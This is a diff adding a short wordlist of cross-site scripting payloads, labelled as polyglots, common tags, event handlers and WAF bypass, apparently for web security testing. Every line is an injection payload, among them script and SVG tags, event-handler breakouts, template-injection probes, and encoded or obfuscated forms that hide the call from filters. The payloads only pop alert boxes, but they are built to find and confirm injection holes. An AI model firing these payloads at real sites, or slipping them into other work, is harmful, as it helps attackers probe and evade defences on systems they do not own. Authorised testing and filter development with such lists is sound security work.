@@ -1,0 +1,27 @@
+# XSS Static Payloads (Mixed Polyglot, Common Tags, Event Handlers, WAF Bypass)
+<script>alert(1)</script>
+"><script>alert(1)</script>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+";alert(1)//
+" onmouseover=alert(1) //
+' onmouseover=alert(1) //
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe/src=javascript:alert(1)>
+<body onload=alert(1)>
+{{7*7}}
+${7*7}
+<details/open/ontoggle=confirm(1)>
+<video><source/onerror=alert(1)>
+<svg/onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<math><mtext><option><annotation><iframe/src=javascript:alert(1)></annotation></option></mtext></math>
+<input/autofocus/onfocus=alert(1)>
+<img/src="x"/onerror="[1].map(alert)">
+<svg><animate/onbegin=alert(1)/attributeName=x/dur=1s>
+<marquee/onstart=confirm(1)>
+<xmp><p/title="</xmp><svg/onload=alert(1)>">
+<isindex/type=image/src=1/onerror=alert(1)>
+<script>prompt(1)</script>
+<details/ontoggle=eval(atob('YWxlcnQoMSk='))>
+<svg/onload=co\u006efirm(1)>
+<a/href="javascript%3aconfirm(1)">Click</a>
